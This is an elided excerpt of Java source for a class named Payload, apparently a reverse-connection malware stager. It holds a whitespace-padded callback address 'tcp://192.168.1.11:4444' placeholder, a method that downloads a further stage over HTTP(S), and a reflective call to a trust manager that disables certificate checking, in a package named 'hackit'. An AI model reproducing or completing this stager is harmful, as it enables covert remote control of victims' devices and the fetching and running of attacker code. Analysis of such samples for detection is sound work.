...
public class Payload {
    ...
    public static final String URL = "ZZZZtcp://192.168.1.11:4444                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                         ";
    ...
    private static void runStageFromHTTP(String url) throws Exception {
        ...
        if (url.startsWith("https")) {
            ...
            Class.forName("com.hackit.signum.hackit.PayloadTrustManager").getMethod("useFor", new Class[]{URLConnection.class}).invoke(null, uc);
